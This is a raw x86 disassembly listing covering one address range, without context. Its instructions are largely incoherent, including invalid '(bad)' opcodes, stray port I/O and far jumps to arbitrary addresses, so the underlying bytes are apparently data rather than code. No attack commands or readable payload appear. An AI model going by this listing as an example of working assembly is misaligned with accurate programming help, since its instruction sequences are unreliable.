  418896:	les    eax,FWORD PTR [esi-0x6]
  418899:	add    edi,0xffffffe7
  41889c:	sti    
  41889d:	cwde   
  41889e:	(bad)  
  4188a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a1:	retf   0xf661
  4188a4:	out    dx,al
  4188a5:	pop    es
  4188a6:	pop    esi
  4188a7:	pop    ebx
  4188a8:	xchg   DWORD PTR [ebx+0x51],ebx
  4188ab:	in     eax,dx
  4188ac:	mov    al,ds:0xe6534304
  4188b1:	cmp    BYTE PTR [ecx+0x1f5395bd],ch
  4188b7:	xchg   esi,eax
  4188b8:	mov    al,0x86
  4188ba:	cmp    eax,edx
  4188bc:	add    dl,BYTE PTR [esi]
  4188be:	leave  
  4188bf:	sub    al,0xb0
  4188c1:	cmp    BYTE PTR ds:0xd1ca434c,dl
  4188c7:	sub    al,0x34
  4188c9:	mov    eax,0x7f1adc0
  4188ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188cf:	jns    0x418942
  4188d1:	aas    
  4188d2:	pop    esi
  4188d3:	scas   eax,DWORD PTR es:[edi]
  4188d4:	lahf   
  4188d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188d6:	push   esp
  4188d7:	mov    ecx,0x3c3c3734
  4188dc:	push   esp
  4188dd:	adc    eax,0xbbfbd3af
  4188e2:	push   esi
  4188e3:	push   ebx
  4188e4:	ds mov dx,0x888c
  4188e9:	call   DWORD PTR [eax]
  4188eb:	sahf   
  4188ec:	xor    BYTE PTR [esp+ebx*1-0x54],bh
  4188f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f1:	loopne 0x418906
  4188f3:	jns    0x418895
  4188f5:	aad    0xa0
  4188f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f8:	aaa    
  4188f9:	mov    bl,0xb5
  4188fb:	in     eax,dx
  4188fc:	sbb    BYTE PTR [ecx-0x3e6ef51f],al
  418902:	pop    ebx
  418903:	and    al,bh
  418905:	cmp    dh,BYTE PTR [ebx+0x3f59607a]
  41890b:	cld    
  41890c:	retf   0x7e50
  41890f:	push   ss
  418910:	std    
  418911:	pop    ds
  418912:	cwde   
  418913:	mov    ebp,0x83b3231a
  418918:	(bad)  
  418919:	int3   
  41891a:	sub    BYTE PTR [ecx+0x71e26b61],al
  418920:	mov    es,WORD PTR ds:0x239dcb08
  418926:	mov    ds:0x799caee2,al
  41892b:	inc    eax
  41892c:	and    DWORD PTR [eax-0x28abf58a],esi
  418932:	add    edx,edx
  418934:	inc    edi
  418935:	lea    eax,[ebx+0x33]
  418938:	fcmovbe st,st(2)
  41893a:	pop    esi
  41893b:	call   0x8a95:0x6d2da135
  418942:	mov    gs,WORD PTR [ebx+0x34]
  418945:	sar    DWORD PTR [edx-0x10],cl
  418948:	retf   
  418949:	stc    
  41894a:	mov    ds,ecx
  41894c:	mov    dl,0x94
  41894e:	xchg   esi,eax
  41894f:	add    DWORD PTR [ebp-0x6a],esi
  418952:	aad    0xc6
  418954:	into   
  418955:	mov    al,BYTE PTR [edi-0x32]
  418958:	mov    ebp,0x3bc9bc97
  41895d:	xor    eax,0x4386a58f
  418962:	sbb    ch,bl
  418964:	shl    BYTE PTR [ebp-0x80],1
  418967:	push   ebx
  418968:	jg     0x418964
  41896a:	jb     0x418946
  41896c:	in     al,dx
  41896d:	call   0xcfcf4fe6
  418972:	sahf   
  418973:	push   edi
  418974:	jns    0x4189ea
  418976:	jmp    0x159a01ea
  41897b:	mov    ch,0x84
  41897d:	stos   BYTE PTR es:[edi],al
  41897e:	es and eax,0x7dd0d72
  418984:	mov    DWORD PTR [edi-0x5b12f4fe],ebp
  41898a:	push   0x9237293f
  41898f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418991:	jbe    0x418992
  418993:	add    eax,ebp
  418995:	or     eax,0xe32e9adb
  41899a:	mov    eax,ds:0x6862a07b
  41899f:	fidiv  DWORD PTR [ebx+edi*4]
  4189a2:	mov    cl,0xe9
  4189a4:	loopne 0x4189ba
  4189a6:	dec    edx
  4189a7:	jg     0x41898b
  4189a9:	mov    bh,ah
  4189ab:	inc    eax
  4189ac:	jp     0x418a11
  4189ae:	mov    ebx,0x3bf5c1f7
  4189b3:	pop    ds
  4189b4:	cmp    DWORD PTR [esp+edi*1+0x5cde54a2],ebx
  4189bb:	pop    esi
  4189bc:	xchg   DWORD PTR [ecx],edi
  4189be:	shl    BYTE PTR [eax-0x2f],1
  4189c1:	ss (bad) 
  4189c3:	jg     0x418991
  4189c5:	fcomi  st,st(1)
  4189c7:	jge    0x4189e1
  4189c9:	int3   
  4189ca:	imul   edi,DWORD PTR [ebx],0x6b
  4189cd:	lock jns 0x41895c
  4189d0:	adc    ebx,esp
  4189d2:	dec    esp
  4189d3:	xchg   esi,eax
  4189d4:	mov    DWORD PTR [eax],esp
  4189d6:	mov    edi,0x53bf500
  4189db:	jo     0x4189de
  4189dd:	inc    edi
  4189de:	lock (bad) 
  4189e0:	inc    eax
  4189e1:	lahf   
  4189e2:	pusha  
  4189e3:	inc    edi
  4189e4:	cmp    DWORD PTR [eax+0x27],ebp
  4189e7:	imul   edx,DWORD PTR [ebp-0x324f1c95],0x445971e1
  4189f1:	mov    bh,0x85
  4189f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f4:	imul   esi,DWORD PTR [edx+0x44d8231c],0x82b7a233
  4189fe:	dec    esp
  4189ff:	call   0x7b64:0xeb4f1e01
  418a06:	repz sbb ch,al
  418a09:	into   
  418a0a:	inc    eax
  418a0b:	inc    esp
  418a0c:	push   cs
  418a0d:	pop    esi
  418a0e:	pop    edi
  418a0f:	into   
  418a10:	xor    eax,0xb64ef9d
  418a15:	xor    eax,0x419b77e2
  418a1a:	or     dl,bh
  418a1c:	repz xchg ebx,eax
  418a1e:	in     eax,0xda
  418a20:	cmp    esp,edx
  418a22:	pop    edi
  418a23:	bnd fs call 0x723c7929
  418a2a:	push   ebp
  418a2b:	push   ss
  418a2c:	outs   dx,DWORD PTR ds:[esi]
  418a2d:	or     DWORD PTR [edx-0x4a],ebp
  418a30:	or     eax,eax
  418a32:	push   eax
  418a33:	add    cl,ah
  418a35:	sub    BYTE PTR [ebp-0xb2b3285],0xe3
  418a3c:	ss dec esp
  418a3e:	in     al,dx
  418a3f:	xor    esp,edi
  418a41:	push   ebp
  418a42:	addr16 iret 
  418a44:	pushf  
  418a45:	adc    eax,0x517e89a8
  418a4a:	pop    edi
  418a4b:	imul   edi,edx,0xffffffc9
  418a4e:	inc    ebx
  418a4f:	pop    eax
  418a50:	hlt    
  418a51:	xchg   ebp,eax
  418a52:	adc    edi,DWORD PTR [ebp-0x34]
  418a55:	bound  ecx,QWORD PTR [esi]
  418a57:	in     al,0x3d
  418a59:	sub    DWORD PTR [edx+0x694bdde2],ecx
  418a5f:	dec    edi
  418a60:	gs icebp 
  418a62:	xchg   edx,eax
  418a63:	fucomip st,st(3)
  418a65:	xor    al,0x84
  418a67:	jo     0x4189ff
  418a69:	aaa    
  418a6a:	mov    ebp,0x232eb34f
  418a6f:	(bad)  
  418a70:	sub    eax,ecx
  418a72:	sbb    esp,DWORD PTR [ecx+esi*4+0x4e]
  418a76:	out    dx,eax
  418a77:	icebp  
  418a78:	ja     0x418a05
  418a7a:	popf   
  418a7b:	jb     0x418a21
  418a7d:	es rcl DWORD PTR es:[esi-0x2face4e4],1
  418a85:	push   edi
  418a86:	addr16 cli 
  418a88:	jp     0x418a46
  418a8a:	out    dx,al
  418a8b:	sbb    ch,dl
  418a8d:	shr    DWORD PTR ds:0x604a8e42,0xe5
  418a94:	adc    bl,BYTE PTR [ecx+0x49]
  418a97:	ins    DWORD PTR es:[edi],dx
  418a98:	jle    0x418a36
  418a9a:	pop    ebx
  418a9b:	add    BYTE PTR [esi-0x4dee71cc],0xf1
  418aa2:	ror    BYTE PTR [edx+0x57393782],1
  418aa8:	nop
  418aa9:	(bad)  
  418aaa:	cld    
  418aab:	dec    edx
  418aac:	or     dh,0x56
  418aaf:	ret    
  418ab0:	test   DWORD PTR [esi+0x4897ffed],esp
  418ab6:	mov    edx,0xa24580eb
  418abb:	loope  0x418a70
  418abd:	sbb    eax,0xa245f15d
  418ac2:	shl    DWORD PTR [esi],1
  418ac4:	dec    esi
  418ac5:	outs   dx,BYTE PTR ds:[esi]
  418ac6:	adc    dl,ah
  418ac8:	pop    ebp
  418ac9:	sub    BYTE PTR [eax+0x6],al
  418acc:	fdivr  DWORD PTR [ebx+0x5f]
  418acf:	adc    ebx,DWORD PTR [edi-0x54]
  418ad2:	pop    ds
  418ad3:	mov    eax,0xbfa0c1b8
  418ad8:	fdiv   DWORD PTR [ecx]
  418ada:	inc    eax
  418adb:	push   es
  418adc:	out    dx,al
  418add:	adc    eax,0x62528f2d
  418ae2:	ss call 0x673e:0x23e56d94
  418aea:	mov    al,0x2f
  418aec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aed:	cmp    al,al
  418aef:	or     al,0x25
  418af1:	inc    edi
  418af2:	add    cl,al
  418af4:	xchg   ebx,eax
  418af5:	pop    es
  418af6:	and    eax,0xf4f1370f
  418afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418afc:	ret    
  418afd:	ret    
  418afe:	cli    
  418aff:	rcr    bh,1
  418b01:	xor    bl,cl
  418b03:	mov    esp,0x55d5d131
  418b08:	fimul  WORD PTR [ecx-0x28fd8409]
  418b0e:	aad    0xff
  418b10:	aam    0x88
  418b12:	mov    dl,0xa2
  418b14:	mov    eax,ds:0x715e191c
  418b19:	popa   
  418b1a:	push   0xdd551d44
  418b1f:	cmp    DWORD PTR [edx-0x67],0x7d
  418b23:	xchg   DWORD PTR [esi-0x72c2b139],ebp
  418b29:	fwait
  418b2a:	sbb    al,0x5e
  418b2c:	pushf  
  418b2d:	in     eax,0xe
  418b2f:	add    esp,DWORD PTR [edx+ebx*2+0x7]
  418b33:	test   DWORD PTR [ebp+edi*4-0x42858e7],edi
  418b3a:	dec    esp
  418b3b:	push   0x18c5335d
  418b40:	push   edi
  418b41:	pop    eax
  418b42:	sub    eax,0xc0969f38
  418b47:	xor    BYTE PTR [esi+0x53],ch
  418b4a:	retf   0xdd78
  418b4d:	and    eax,0x1d37878b
  418b52:	push   ebx
  418b53:	adc    al,0xfc
  418b55:	hlt    
  418b56:	idiv   BYTE PTR [ebx+eiz*4]
  418b59:	or     edi,esi
  418b5b:	hlt    
  418b5c:	inc    edx
  418b5d:	call   0x7033:0x399158a3
  418b64:	test   eax,0x628fd2a1
  418b69:	add    al,0x5
  418b6b:	add    BYTE PTR [eax-0x5a979aa1],cl
  418b71:	pop    esi
  418b72:	shl    DWORD PTR [ecx-0x6c5f175d],cl
  418b78:	xchg   DWORD PTR [edi+0x79d77b00],esp
  418b7e:	fs push ebx
  418b80:	jge    0x418b5f
  418b82:	or     al,0x46
  418b84:	mov    edi,0x5111aadc
  418b89:	aas    
  418b8a:	stos   DWORD PTR es:[edi],eax
  418b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b8c:	pop    ecx
  418b8d:	xchg   edi,eax
  418b8e:	xor    DWORD PTR [ecx-0x6ddc82ed],edx
  418b94:	push   edx
  418b95:	lods   al,BYTE PTR ds:[esi]
  418b96:	push   ecx
  418b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b98:	mov    cl,0x2d
  418b9a:	std    
  418b9b:	(bad)  
  418b9c:	mov    bl,0xb4
  418b9e:	nop
  418b9f:	ret    0x1cb3
  418ba2:	jmp    0xf44abcc2
  418ba7:	rol    DWORD PTR [edx-0x2b31185c],1
  418bad:	test   DWORD PTR [eax],edi
  418baf:	addr16 int 0x37
  418bb2:	test   DWORD PTR [ebx-0x3d],eax
  418bb5:	mov    cl,0x6d
  418bb7:	addr16 cwde 
  418bb9:	push   esp
  418bba:	or     cl,al
  418bbc:	stos   BYTE PTR es:[edi],al
  418bbd:	loop   0x418bcc
  418bbf:	mov    edx,edi
  418bc1:	lahf   
  418bc2:	or     BYTE PTR [eax-0x49],cl
  418bc5:	cmp    DWORD PTR [edi],ebp
  418bc7:	inc    ebp
  418bc8:	inc    ebx
  418bc9:	inc    edx
  418bca:	pop    ds
  418bcb:	sbb    esi,esp
  418bcd:	mov    dl,0x29
  418bcf:	punpcklbw mm6,mm5
  418bd2:	sbb    BYTE PTR [eax-0x1c],0x30
  418bd6:	xor    al,0x1e
  418bd8:	jmp    0x8ddc9a99
  418bdd:	sbb    eax,0xdef5f1ed
  418be2:	jg     0x418c5c
  418be4:	imul   edi,DWORD PTR [ecx],0xffffffd1
  418be7:	sub    al,0x11
  418be9:	es pop edi
  418beb:	mov    ebp,0x1b25a950
  418bf0:	inc    ebp
  418bf1:	rol    BYTE PTR [ecx+ebp*1-0x7dfe1cc6],cl
  418bf8:	push   edi
  418bf9:	or     DWORD PTR [eax],edx
  418bfb:	jnp    0x418bc4
  418bfd:	jle    0x418c5a
  418bff:	in     al,0x96
  418c01:	dec    edx
  418c02:	push   ebp
  418c03:	xor    cl,BYTE PTR [esi-0x3581afa1]
  418c09:	paddb  mm2,QWORD PTR [ecx-0x1f47a3a5]
  418c10:	adc    al,0xe2
  418c12:	fsubr  DWORD PTR [esi]
  418c14:	test   DWORD PTR [edi],0x623e3a41
  418c1a:	pusha  
  418c1b:	cdq    
  418c1c:	jae    0x418c3c
  418c1e:	jae    0x418baf
  418c20:	jae    0x418bbf
  418c22:	xchg   esp,eax
  418c23:	popa   
  418c24:	or     BYTE PTR [ecx-0x1d3fea09],al
  418c2a:	into   
  418c2b:	test   al,0x9e
  418c2d:	(bad)  
  418c2e:	repnz mov ecx,DWORD PTR [ebp+0x62]
  418c32:	test   eax,0xbb2b4a62
  418c37:	mul    BYTE PTR [ebx+ebx*4+0x2b269436]
  418c3e:	cld    
  418c3f:	or     BYTE PTR [ecx],bh
  418c41:	lods   eax,DWORD PTR ds:[esi]
  418c42:	in     eax,0x9
  418c44:	sub    al,0xd5
  418c46:	mov    esp,0x91f888dd
  418c4b:	aaa    
  418c4c:	test   al,0x6c
  418c4e:	mov    WORD PTR [edi],cs
  418c50:	xchg   esp,eax
  418c51:	fucomi st,st(6)
  418c53:	jmp    0x418c7a
  418c55:	popa   
  418c56:	das    
  418c57:	add    al,0x8f
  418c59:	adc    al,0x2c
  418c5b:	mov    dl,0xa9
  418c5d:	pop    esi
  418c5e:	cmc    
  418c5f:	or     ch,dl
  418c61:	ja     0x418c2b
  418c63:	add    eax,0x63f0d0eb
  418c68:	gs jle 0x418c0d
  418c6b:	mov    bh,0x48
  418c6d:	les    esi,FWORD PTR [edi]
  418c6f:	in     al,0x23
  418c71:	and    esp,ecx
  418c73:	popf   
  418c74:	test   DWORD PTR [edx+ebp*2],esp
  418c77:	sbb    al,0xc0
  418c79:	dec    ebp
  418c7a:	jle    0x418cdf
  418c7c:	ret    
  418c7d:	ret    0xddb4
  418c80:	jno    0x418c54
  418c82:	ins    BYTE PTR es:[edi],dx
  418c83:	pushf  
  418c84:	clc    
  418c85:	fwait
  418c86:	stos   BYTE PTR es:[edi],al
  418c87:	jae    0x418c26
  418c89:	or     ch,BYTE PTR [eax-0x582bcff3]
  418c8f:	push   ds
  418c90:	loope  0x418c72
  418c92:	pop    ebx
  418c93:	sahf   
  418c94:	cmp    BYTE PTR [eax+ebp*1],0xd6
  418c98:	packuswb mm2,mm7
  418c9b:	jecxz  0x418c69
  418c9d:	lods   al,BYTE PTR ds:[esi]
  418c9e:	sbb    dl,bh
  418ca0:	(bad)  
  418ca1:	mov    DWORD PTR fs:[edi+0x4550dd7e],eax
  418ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ca9:	dec    ebp
  418caa:	mov    ch,ah
  418cac:	fcmovbe st,st(0)
  418cae:	mov    ebx,0xf1dcf70b
  418cb3:	rol    bh,0x55
  418cb6:	jo     0x418cfc
  418cb8:	loope  0x418c5a
  418cba:	retf   
  418cbb:	pop    edi
  418cbc:	scas   eax,DWORD PTR es:[edi]
  418cbd:	ficom  WORD PTR [eax+0x2f]
  418cc0:	aaa    
  418cc1:	mov    ebp,DWORD PTR [esi]
  418cc3:	stos   DWORD PTR es:[edi],eax
  418cc4:	shl    cl,cl
  418cc6:	xchg   ebp,eax
  418cc7:	adc    DWORD PTR [edx+ebx*1-0x71],ebx
  418ccb:	clc    
  418ccc:	shl    BYTE PTR [ebx+0x2dc4980a],cl
  418cd2:	push   es
  418cd3:	(bad)  
  418cd4:	mov    esi,0x11ba6502
  418cd9:	push   0xffffffd4
  418cdb:	fsubr  DWORD PTR [ebx+0xd]
  418cde:	(bad)  
  418cdf:	repnz mov esi,?
  418ce2:	outs   dx,BYTE PTR ds:[esi]
  418ce3:	jg     0x418cb7
  418ce5:	daa    
  418ce6:	cdq    
  418ce7:	or     edx,DWORD PTR [bx-0x23]
  418ceb:	inc    BYTE PTR [ebp+0x248dab2b]
  418cf1:	lock or edx,DWORD PTR [ebp-0x59]
  418cf5:	(bad)  
  418cf7:	addr16 std 
  418cf9:	and    eax,0x1708e8dc
  418cfe:	and    DWORD PTR [ecx-0x67acfbb7],eax
  418d04:	mov    al,0xb6
  418d06:	jl     0x418ca8
  418d08:	mov    ecx,0x82cd326c
  418d0d:	mov    ecx,0xb49b27ed
  418d12:	daa    
  418d13:	dec    edx
  418d14:	jecxz  0x418cd2
  418d16:	repz xor bh,BYTE PTR [ecx+0x5662a9a3]
  418d1d:	push   eax
  418d1e:	xchg   ecx,eax
  418d1f:	and    bh,BYTE PTR [esi+0xf]
  418d22:	sub    al,0xbd
  418d24:	pop    ebx
  418d25:	retf   0x684d
  418d28:	pop    esi
  418d29:	js     0x418d09
  418d2b:	push   ecx
  418d2c:	hlt    
  418d2d:	std    
  418d2e:	cli    
  418d2f:	jno    0x418dad
  418d31:	adc    BYTE PTR [edx-0xd],ah
  418d34:	(bad)  
  418d35:	push   eax
  418d36:	pop    esi
  418d37:	and    BYTE PTR [eax-0x14336dfc],dl
  418d3d:	imul   ebx,DWORD PTR [ebx-0x8],0x33
  418d41:	and    eax,0xa1e11685
  418d46:	jno    0x418d3b
  418d48:	(bad)
  418d4c:	dec    ecx
  418d4d:	and    eax,0xb3466c2
  418d52:	pop    esi
  418d53:	sahf   
  418d54:	je     0x418d9a
  418d56:	outs   dx,DWORD PTR ds:[esi]
  418d57:	jno    0x418d33
  418d59:	jbe    0x418d61
  418d5b:	pop    eax
  418d5c:	lods   eax,DWORD PTR ds:[esi]
  418d5d:	mov    ch,0x67
  418d5f:	adc    eax,0xb5f13353
  418d64:	mov    bl,0x28
  418d66:	add    al,0x42
  418d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d69:	mov    ah,0x3d
  418d6b:	sar    BYTE PTR [esi],1
  418d6d:	jmp    0xfd051591
  418d72:	out    0xc3,eax
  418d74:	arpl   sp,sp
  418d76:	push   cs
  418d77:	inc    esp
  418d78:	sub    BYTE PTR [edi+0x26d0fee9],ch
  418d7e:	test   DWORD PTR [ebx],0x2c24c775
  418d84:	xor    ch,bh
  418d86:	push   ss
  418d87:	jno    0x418d31
  418d89:	jo     0x418d27
  418d8b:	mov    ch,cl
  418d8d:	les    esp,FWORD PTR [ecx-0x6ab5ea52]
  418d93:	add    bl,dh
  418d95:	push   ebp
  418d96:	stos   BYTE PTR es:[edi],al
  418d97:	mov    ah,BYTE PTR [edi]
  418d99:	out    dx,eax
  418d9a:	cmp    al,0xb4
  418d9c:	push   ebp
  418d9d:	add    eax,0xbdaac37
  418da2:	je     0x418dc2
  418da4:	leave  
  418da5:	sbb    DWORD PTR [eax+edi*4-0x4ef8d184],0x10
  418dad:	add    ecx,DWORD PTR [ebx]
  418daf:	test   DWORD PTR [eax-0x1b],eax
  418db2:	mov    ds:0x766e1500,eax
  418db7:	inc    ecx
  418db8:	call   0x480121b9
  418dbd:	mov    ds:0x4494478d,eax
  418dc2:	arpl   WORD PTR [edi],bp
  418dc4:	punpcklbw mm1,DWORD PTR [ebx+0x1]
  418dc8:	imul   ebx,DWORD PTR ds:0xbc8ec622,0xe0e7e407
  418dd2:	jmp    0xfad8c7d
  418dd7:	or     edi,DWORD PTR ds:0x3041a1cf
  418ddd:	sub    DWORD PTR [esi+0x40],esp
  418de0:	lea    edi,[eax]
  418de2:	and    ebx,0xf07297f9
  418de8:	(bad)  
  418de9:	cli    
  418dea:	and    eax,0x9bbf3318
  418def:	pop    eax
  418df0:	imul   eax,DWORD PTR [ebp-0x77],0x12
  418df4:	mov    edi,0x59ca993f
  418df9:	scas   eax,DWORD PTR es:[edi]
  418dfa:	mov    ebx,0x2501c791
  418dff:	inc    ecx
  418e00:	cwde   
  418e01:	or     eax,0x5651554
  418e06:	xchg   ebx,eax
  418e07:	and    eax,eax
  418e09:	in     eax,0xbf
  418e0b:	jno    0x418e45
  418e0d:	loope  0x418e7d
  418e0f:	push   esi
  418e10:	xlat   BYTE PTR ds:[ebx]
  418e11:	add    esp,DWORD PTR [esi]
  418e13:	xor    ebx,DWORD PTR [edx+0x5891f844]
  418e19:	or     bh,cl
  418e1b:	push   0x36166928
  418e20:	mov    esi,0x40acb1d4
  418e25:	and    DWORD PTR [eax+eax*1+0x6a],esp
  418e29:	lods   al,BYTE PTR ds:[esi]
  418e2a:	fwait
  418e2b:	sub    eax,0xdc967cb9
  418e30:	ret    
  418e31:	je     0x418db5
  418e33:	int3   
  418e34:	xchg   ebx,eax
  418e35:	rcl    dh,1
  418e37:	out    dx,eax
  418e38:	and    BYTE PTR [ecx-0x4a],ah
  418e3b:	cmp    ah,dl
  418e3d:	or     ch,BYTE PTR [ebp-0x7]
  418e40:	stc    
  418e41:	jle    0x418e66
  418e43:	enter  0xd03f,0xee
  418e47:	iret   
  418e48:	add    eax,0x3dd0cf36
  418e4d:	mov    cl,0x57
  418e4f:	stos   DWORD PTR es:[edi],eax
  418e50:	mov    ebx,0x80f2a02
  418e55:	repnz mov BYTE PTR [eax+esi*8-0x77],al
  418e5a:	jb     0x418ed4
  418e5c:	shl    BYTE PTR [esi+0x58],cl
  418e5f:	push   edx
  418e60:	popf   
  418e61:	cli    
  418e62:	push   ss
  418e63:	adc    al,BYTE PTR [edx+0x59]
  418e66:	or     dl,BYTE PTR [ecx]
  418e68:	add    WORD PTR [ecx+0x2802f3f7],bp
  418e6f:	jl     0x418ee0
  418e71:	fst    QWORD PTR [bp+si+0x65]
  418e75:	stos   DWORD PTR es:[edi],eax
  418e76:	test   eax,0xa42b77
  418e7b:	push   ds
  418e7c:	aaa    
  418e7d:	add    edi,DWORD PTR [ebx+0x791ea853]
  418e83:	push   ecx
  418e84:	add    edx,esp
  418e86:	xchg   esi,eax
  418e87:	mov    BYTE PTR [eax+0x4a2357d3],ch
  418e8d:	or     esi,edx
  418e8f:	dec    ecx
  418e90:	in     eax,dx
  418e91:	fstp   st(0)
  418e93:	jmp    0x38d8:0xff89d8a9
  418e9a:	mov    ds:0x39d3cde5,eax
  418e9f:	push   ds
  418ea0:	xor    bh,BYTE PTR [eax]
  418ea2:	mov    dl,0xbb
  418ea4:	sbb    al,0xec
  418ea6:	ds pop ebp
  418ea8:	fisttp QWORD PTR [edx]
  418eaa:	nop
  418eab:	test   eax,0xf0e9a982
  418eb0:	sub    DWORD PTR [edx+0x29],esi
  418eb3:	shl    BYTE PTR [ebx],1
  418eb5:	inc    ecx
  418eb6:	pushf  
  418eb7:	cmp    eax,0xab8195ee
  418ebc:	or     eax,0xd6d83217
  418ec1:	push   0xfffffffa
  418ec3:	clc    
  418ec4:	out    dx,eax
  418ec5:	mov    ebp,0xc1753bd3
  418eca:	dec    esi
  418ecb:	jo     0x418e73
  418ecd:	les    eax,FWORD PTR [edi]
  418ecf:	and    DWORD PTR [edx-0x486b99a2],ecx
  418ed5:	lods   al,BYTE PTR ds:[esi]
  418ed6:	nop
  418ed7:	and    BYTE PTR [esi+eiz*2],ch
  418eda:	popf   
  418edb:	das    
  418edc:	push   ebx
  418edd:	lods   eax,DWORD PTR ds:[esi]
  418ede:	dec    eax
  418edf:	xchg   edx,eax
  418ee0:	(bad)  
  418ee2:	and    eax,0x4eb92943
  418ee7:	iret   
  418ee8:	push   ecx
  418ee9:	cmp    BYTE PTR [esi],ah
  418eeb:	scas   al,BYTE PTR es:[edi]
  418eec:	inc    esi
  418eed:	push   ecx
  418eee:	cmc    
  418eef:	cdq    
  418ef0:	jmp    0x418edb
  418ef2:	lock test DWORD PTR [eax+0x15ed8867],0x1f2361f1
  418efd:	outs   dx,DWORD PTR ds:[esi]
  418efe:	pop    eax
  418eff:	mov    cs,WORD PTR [edx]
  418f01:	dec    edi
  418f02:	sub    eax,0xa4aa6b71
  418f07:	xlat   BYTE PTR ds:[ebx]
  418f08:	or     ecx,eax
  418f0a:	mov    esi,0xb503cb6a
  418f0f:	mov    bl,0x21
  418f11:	in     eax,dx
  418f12:	and    dh,BYTE PTR [esi-0x14]
  418f15:	sub    eax,0x5eb1c579
  418f1a:	lods   al,BYTE PTR ds:[esi]
  418f1b:	xchg   ecx,eax
  418f1c:	adc    al,0x6c
  418f1e:	add    eax,0x77564678
  418f23:	dec    ebp
  418f24:	scas   eax,DWORD PTR es:[edi]
  418f25:	inc    edi
  418f26:	(bad)  
  418f27:	jmp    0x418f16
  418f29:	mov    al,ds:0x8336615e
  418f2e:	std    
  418f2f:	mov    al,0xf
  418f31:	rcl    BYTE PTR [eax],cl
  418f33:	sub    al,ah
  418f35:	add    ecx,DWORD PTR [eax]
  418f37:	test   BYTE PTR [eax],ah
  418f39:	mov    cl,0x49
  418f3b:	and    eax,0xbe67c930
  418f40:	stc    
  418f41:	(bad)
  418f44:	push   es
  418f45:	adc    DWORD PTR [esi],eax
  418f47:	xor    bh,dh
  418f49:	cs xchg ebx,eax
  418f4b:	mov    edi,ecx
  418f4d:	mov    WORD PTR [eax+0x61],es
  418f50:	aam    0xd1
  418f52:	xor    BYTE PTR [ebx+ebx*8-0x1a],0xe5
  418f57:	mov    edx,0xa2fa2489
  418f5c:	add    bl,0x86
  418f5f:	(bad)  
  418f60:	(bad)  
  418f62:	mov    es,WORD PTR [ecx]
  418f64:	fimul  DWORD PTR [esi]
  418f66:	push   0xffffffed
  418f68:	sub    BYTE PTR [ebx+0x9c246a9],bl
  418f6e:	out    0xf0,eax
  418f70:	sub    al,0xc1
  418f72:	js     0x418f25
  418f74:	aaa    
  418f75:	xlat   BYTE PTR ds:[ebx]
  418f76:	ins    BYTE PTR es:[edi],dx
  418f77:	add    BYTE PTR [edx-0x6a],ah
  418f7a:	pop    ecx
  418f7b:	add    eax,0x66992d1
  418f80:	aaa    
  418f81:	jbe    0x418f05
  418f83:	aas    
  418f84:	adc    al,0x2d
  418f86:	(bad)  
  418f87:	xchg   ebx,eax
  418f88:	loop   0x418f53
  418f8a:	mov    ecx,gs
  418f8c:	(bad)  
  418f8d:	out    dx,al
  418f8e:	cmp    eax,0x7b7bb15f
  418f93:	dec    esp
  418f94:	jne    0x418f6c
  418f96:	push   eax
  418f97:	call   0x8ccdd88c
  418f9c:	and    eax,0x3c9dc203
  418fa1:	sub    DWORD PTR [edx+ecx*8],0xaa355df3
  418fa8:	cmp    DWORD PTR [eax+ecx*4+0x2bd58c4d],ebp
  418faf:	sbb    dh,BYTE PTR [eax]
  418fb1:	pop    ebx
  418fb2:	jae    0x419025
  418fb4:	xor    ch,ch
  418fb6:	inc    edx
  418fb7:	ret    
  418fb8:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  418fba:	dec    ebx
  418fbb:	mov    dh,0x6e
  418fbd:	xor    al,0xe4
  418fbf:	sub    bl,BYTE PTR [esi-0x24a45382]
  418fc5:	push   edi
  418fc6:	pop    esi
  418fc7:	and    esp,DWORD PTR [ecx+ebp*1]
  418fca:	(bad)  
  418fcb:	mov    ds:0x49d92fb9,al
  418fd0:	(bad)  
  418fd1:	je     0x418f53
  418fd3:	sbb    ebx,0xffffff92
  418fd6:	mov    ebx,0x293e2ce5
  418fdb:	loopne 0x419002
  418fdd:	repz mov eax,cs:0x63324d9
  418fe4:	call   0x6fe97877
  418fe9:	cwde   
  418fea:	ja     0x419003
  418fec:	cdq    
  418fed:	into   
  418fee:	adc    al,0xae
  418ff0:	das    
  418ff1:	fld    QWORD PTR [esi]
  418ff3:	mov    ds:0xd34da23f,eax
  418ff8:	sub    al,0x29
  418ffa:	adc    BYTE PTR [ecx-0x54],dl
  418ffd:	rcr    BYTE PTR [eax-0x45],cl
  419000:	xor    al,0x96
  419002:	inc    esi
  419003:	dec    eax
  419004:	cli    
  419005:	and    ecx,edi
  419007:	nop
  419008:	aam    0xe1
  41900a:	pop    ecx
  41900b:	sahf   
  41900c:	sub    dl,ah
  41900e:	sub    BYTE PTR [ecx+0x5b],0x46
  419012:	test   al,0x5d
  419014:	cmp    ebp,DWORD PTR ds:0xbd3b4853
  41901a:	push   ecx
  41901b:	es mov al,0x8c
  41901e:	jae    0x419020
  419020:	in     al,0x6a
  419022:	call   0xa90b6c79
  419027:	dec    esi
  419028:	adc    dl,BYTE PTR [ecx+0x17]
  41902b:	jp     0x419046
  41902d:	xchg   DWORD PTR [esi],ebp
  41902f:	es inc ebp
  419031:	mov    dh,0x23
  419033:	xor    al,0x32
  419035:	inc    edi
  419036:	int3   
  419037:	xchg   ebp,eax
  419038:	stos   DWORD PTR es:[edi],eax
  419039:	or     eax,0x19ce23ee
  41903e:	shl    edi,1
  419040:	(bad)  
  419041:	js     0x419029
  419043:	inc    esi
  419044:	inc    eax
